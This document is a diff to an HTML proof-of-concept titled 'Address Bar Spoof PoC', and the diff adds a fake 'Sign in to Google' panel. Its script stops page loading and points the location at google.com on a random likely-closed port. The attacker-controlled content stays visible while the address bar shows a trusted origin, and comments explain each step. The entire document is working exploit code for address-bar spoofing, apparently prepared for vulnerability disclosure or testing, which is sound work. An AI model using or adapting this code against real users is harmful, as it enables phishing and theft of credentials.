@@ -1,13 +1,22 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Address Bar Spoof PoC</title>
+<style>body{font:16px system-ui;margin:2rem} .fake{border:1px solid #ddd;padding:1rem;border-radius:8px}</style>
+<div class="fake">
+  <h1>Sign in to Google</h1>
+  <p>This is attacker-controlled content.</p>
+</div>
 <script>
-    function spoof() {
-        setTimeout(() => {
-            window.stop();
-            let randomPort;
-            do {
-                randomPort = Math.floor(Math.random() * 1000);
-            } while (randomPort === 0 || randomPort === 443);
-            document.location = "https://google.com:" + randomPort + "/";
-        }, 300);
-    }
-    spoof();
+  function spoof() {
+    setTimeout(() => {
+      // Keep attacker DOM on screen
+      window.stop();
+      // Choose a non-standard likely-closed port so navigation won't commit
+      let randomPort;
+      do { randomPort = Math.floor(Math.random() * 1000); } while (randomPort === 0 || randomPort === 443);
+      // Point the address bar at a trusted origin with an unreachable port
+      document.location = "https://google.com:" + randomPort + "/";
+    }, 300); // allow DOM to render before switching URL
+  }
+  spoof();
 </script>
